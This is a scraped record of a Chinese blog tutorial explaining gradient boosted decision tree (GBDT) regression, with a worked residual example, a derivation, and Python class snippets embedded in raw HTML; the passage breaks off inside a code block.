both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/keelii\">keelii</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/keelii\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/08/3b953d3d7c4ae0591aa2783678869f3b.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            It’s not who you are underneath, it’s what you do that defines you        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/keelii\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/keelii/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/keelii/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 5</a> · <a title=\"我的网站\" target=\"_blank\" href=\"https://keelii.github.io/\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/keelii\"><i class=\"fa fa-weibo\"></i></a> <a title=\"个人微信：keelii\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a> <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/keelii\"><i class=\"fa fa-github\"></i></a> <a title=\"Twitter主页\" target=\"_blank\" href=\"https://twitter.com/keelii\"><i class=\"fa fa-twitter\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/4c6abd763d27eeeb4c7e7665f213388ec74df623.jpg"}
{"title": "GBDT 回归的原理与 Python 实现", "url": "http://blog.jobbole.com/114351/", "create_date": "2018/09/05", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/9e08e0b08f1c54458be8116208d9b31c.jpg"], "url_object_id": "bca3c26357bace69af7d53a2db635d8f", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,GBDT", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/jobbole\">伯乐在线读者</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>提到GBDT回归相信大家应该都不会觉得陌生（不陌生你点进来干嘛[捂脸]），本文就GBDT回归的基本原理进行讲解，并手把手、肩并肩地带您实现这一算法。</p>\n<div>\n<p>完整实现代码请参考本人的p…哦不是…github：</p>\n<ul>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/tushushu/imylu/blob/master/imylu/ensemble/gbdt_base.py\" target=\"_blank\">gbdt_base.pygithub.com</a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/tushushu/imylu/blob/master/imylu/ensemble/gbdt_regressor.py\" target=\"_blank\">gbdt_regressor.pygithub.com</a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/tushushu/imylu/blob/master/examples/gbdt_regressor_example.py\" target=\"_blank\">gbdt_regressor_example.pygithub.com</a></li>\n</ul>\n<h1>1. 原理篇</h1>\n<p>我们用人话而不是大段的数学公式来讲讲GBDT回归是怎么一回事。</p>\n<h2>1.1 温故知新</h2>\n<p>回归树是GBDT的基础，之前的一篇文章曾经讲过回归树的原理和实现。链接如下：</p>\n<blockquote><p><a href=\"https://zhuanlan.zhihu.com/p/41688007\" target=\"_blank\">李小文：回归树的原理与Python实现zhuanlan.zhihu.com<img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/feac768c0a0f8febdb4166c62f50de8a.jpg\" alt=\"图标\"></a></p></blockquote>\n<h2>1.2 预测年龄</h2>\n<p>仍然以预测同事年龄来举例，从<a href=\"http://blog.jobbole.com/114261/\">《回归树》</a>那篇文章中我们可以知道，如果需要通过一个常量来预测同事的年龄，平均值是最佳的选择之一。</p>\n<h2>1.3 年龄的残差</h2>\n<p>我们不妨假设同事的年龄分别为5岁、6岁、7岁，那么同事的平均年龄就是6岁。所以我们用6岁这个常量来预测同事的年龄，即[6, 6, 6]。每个同事年龄的残差 = 年龄 – 预测值 = [5, 6, 7] – [6, 6, 6]，所以残差为[-1, 0, 1]</p>\n<h2>1.4 预测年龄的残差</h2>\n<p>为了让模型更加准确，其中一个思路是让残差变小。如何减少残差呢？我们不妨对残差建立一颗回归树，然后预测出准确的残差。假设这棵树预测的残差是[-0.9, 0, 0.9]，将上一轮的预测值和这一轮的预测值求和，每个同事的年龄 = [6, 6, 6] + [-0.9, 0, 0.9] = [5.1, 6, 6.9]，显然与真实值[5, 6, 7]更加接近了， 年龄的残差此时变为[-0.1, 0, 0.1]。显然，预测的准确性得到了提升。</p>\n<h2>1.5 GBDT</h2>\n<p>重新整理一下思路，假设我们的预测一共迭代3轮 年龄：[5, 6, 7]</p>\n<p>第1轮预测：[6, 6, 6] (平均值)</p>\n<p>第1轮残差：[-1, 0, 1]</p>\n<p>第2轮预测：[6, 6, 6] (平均值) + [-0.9, 0, 0.9] (第1颗回归树) = [5.1, 6, 6.9]</p>\n<p>第2轮残差：[-0.1, 0, 0.1]</p>\n<p>第3轮预测：[6, 6, 6] (平均值) + [-0.9, 0, 0.9] (第1颗回归树) + [-0.08, 0, 0.07] (第2颗回归树) = [5.02, 6, 6.97]</p>\n<p>第3轮残差：[-0.08, 0, 0.03]</p>\n<p>看上去残差越来越小，而这种预测方式就是GBDT算法。</p>\n<h2>1.6 公式推导</h2>\n<p>看到这里，相信您对GBDT已经有了直观的认识。这么做有什么科学依据么，为什么残差可以越来越小呢？前方小段数学公式低能预警。</p>\n<ol>\n<li>假设要做m轮预测，预测函数为Fm，初始常量或每一轮的回归树为fm，输入变量为X，有：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+F_m%28X%29+%3D+F_%7Bm-1%7D%28X%29+%2B+f_m%28X%29\" alt=\" F_m(X) = F_{m-1}(X) + f_m(X)\"></li>\n<li>设要预测的变量为y，采用MSE作为损失函数：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+Loss%28y%2C+F_m%28X%29%29+%3D+%5CLarge%5Cfrac%7B1%7D%7Bm%7D%5Cnormalsize%5Csum_%7Bi%3D0%7D%5Em%28%28y_i+-+F_m%28x_i%29%29+%5E+2%29\" alt=\" Loss(y, F_m(X)) = Largefrac{1}{m}normalsizesum_{i=0}^m((y_i - F_m(x_i)) ^ 2)\"></li>\n<li>我们知道泰勒公式的一阶展开式是长成这个样子滴：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+f%28x+%2B+x_0%29+%3D+f%28x%29+%2B+f%27%28x%29+%2A+x_0\" alt=\" f(x + x_0) = f(x) + f'(x) * x_0\"></li>\n<li>如果：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+f%28x%29+%3D+g%27%28x%29\" alt=\" f(x) = g'(x)\"></li>\n<li>那么，根据式3和式4可以得出：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+g%27%28x+%2B+x_0%29+%3D+g%27%28x%29+%2B+g%27%27%28x%29+%2A+x_0\" alt=\" g'(x + x_0) = g'(x) + g''(x) * x_0\"></li>\n<li>根据式2可以知道，损失函数的一阶偏导数为:<br>\n<img src=\"https://www.zhihu.com/equation?tex=+Loss%27%28y%2C+F_m%28X%29%29+%3D+-%5CLarge%5Cfrac%7B2%7D%7Bn%7D%5Cnormalsize%5Csum_%7Bi%3D0%7D%5Em%28y_i+-+F_m%28x_i%29%29\" alt=\" Loss'(y, F_m(X)) = -Largefrac{2}{n}normalsizesum_{i=0}^m(y_i - F_m(x_i))\"></li>\n<li>根据式6可以知道，损失函数的二阶偏导数为：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+Loss%27%27%28y%2C+F_m%28X%29%29+%3D+2\" alt=\" Loss''(y, F_m(X)) = 2\"></li>\n<li>蓄力结束，开始放大招。根据式1，损失函数的一阶导数为：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+Loss%27%28y%2C+F_m%28X%29%29+%3D+Loss%27%28y%2C+F_%7Bm-1%7D%28X%29+%2B+f_m%28X%29%29\" alt=\" Loss'(y, F_m(X)) = Loss'(y, F_{m-1}(X) + f_m(X))\"></li>\n<li>根据式5，将式8进一步展开为：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+Loss%27%28y%2C+F_m%28X%29%29%3D+Loss%27%28y%2C+F_%7Bm-1%7D%28X%29%29+%2B+Loss%27%27%28y%2C+F_%7Bm-1%7D%28X%29%29+%2A+f_m%28X%29\" alt=\" Loss'(y, F_m(X))= Loss'(y, F_{m-1}(X)) + Loss''(y, F_{m-1}(X)) * f_m(X)\"></li>\n<li>令式9，即损失函数的一阶偏导数为0，那么：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+f_m%28X%29+%3D+-+Loss%27%28y%2C+F_%7Bm-1%7D%28X%29%29+%2F+Loss%27%27%28y%2C+F_%7Bm-1%7D%28X%29%29\" alt=\" f_m(X) = - Loss'(y, F_{m-1}(X)) / Loss''(y, F_{m-1}(X))\"></li>\n<li>将式6，式7代入式9得到：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+f_m%28X%29+%3D+%5CLarge%5Cfrac%7B1%7D%7Bn%7D%5Cnormalsize%5Csum_%7Bi%3D0%7D%5Em%28y_i+-+F_%7Bm-1%7D%28x_i%29%29\" alt=\" f_m(X) = Largefrac{1}{n}normalsizesum_{i=0}^m(y_i - F_{m-1}(x_i))\"></li>\n</ol>\n<p>因此，我们需要通过用第m-1轮残差的均值来得到函数fm，进而优化函数Fm。而回归树的原理就是通过最佳划分区域的均值来进行预测。所以fm可以选用回归树作为基础模型，将初始值，m-1颗回归树的预测值相加便可以预测y。</p>\n<h1>2. 实现篇</h1>\n<p>本人用全宇宙最简单的编程语言——Python实现了GBDT回归算法，没有依赖任何第三方库，便于学习和使用。简单说明一下实现过程，更详细的注释请参考本人github上的代码。</p>\n<h2>2.1 导入回归树类</h2>\n<p>回归树是我之前已经写好的一个类，在之前的文章详细介绍过，代码请参考：</p>\n<blockquote><p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/tushushu/Imylu/blob/master/regression_tree.py\" target=\"_blank\">regression_tree.pygithub.com</a></p></blockquote>\n<div></div>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670543583131635765\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfrom ..tree.regression_tree import RegressionTree</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670543583131635765-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670543583131635765-1\"><span class=\"crayon-i\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tree</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">regression_tree </span><span class=\"crayon-e\">import </span><span class=\"crayon-v\">RegressionTree</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n\n</div>\n<h2>2.2 创建GradientBoostingBase类</h2>\n<p>初始化，存储回归树、学习率、初始预测值和变换函数。（注：回归不需要做变换，因此函数的返回值等于参数）</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67054358e635707634\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass GradientBoostingBase(object):\r\n    def __init__(self):\r\n        self.trees = None\r\n        self.lr = None\r\n        self.init_val = None\r\n        self.fn = lambda x: x</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67054358e635707634-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67054358e635707634-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67054358e635707634-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67054358e635707634-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67054358e635707634-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67054358e635707634-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67054358e635707634-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GradientBoostingBase</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67054358e635707634-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">def </span><span class=\"crayon-e\">__init__</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab67054358e635707634-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">trees</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67054358e635707634-4\"><span class=\"crayon-e\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">lr</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None</span></div><div class=\"crayon-line\" id=\"crayon-5bab67054358e635707634-5\"><span class=\"crayon-e\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">init_val</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67054358e635707634-6\"><span class=\"crayon-e\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">fn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0121 seconds] -->\r\n\n</div>\n<h2>2.3 计算初始预测值</h2>\n<p>初始预测值即y的平均值。</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670543592616451358\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef _get_init_val(self, y):\r\n    return sum(y) / len(y)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670543592616451358-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543592616451358-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670543592616451358-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">_get_init_val</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543592616451358-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n\n</div>\n<h2>2.4 计算残差</h2>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670543596314725994\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef _get_residuals(self, y, y_hat):\r\n    return [yi - self.fn(y_hat_i) for yi, y_hat_i in zip(y, y_hat)]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670543596314725994-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670543596314725994-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670543596314725994-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">_get_residuals</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_hat</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670543596314725994-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">yi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">fn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">y_hat_i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">yi</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">y_hat_i </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">zip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_hat</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n\n</div>\n<h2>2.5 训练模型</h2>\n<p>训练模型的时候需要注意以下几点： 1. 控制树的最大深度max_depth； 2. 控制分裂时最少的样本量min_samples_split； 3. 训练每一棵回归树的时候要乘以一个学习率lr，防止模型过拟合； 4. 对样本进行抽样的时候要采用有放回的抽样方式。</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670543599514300216\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly 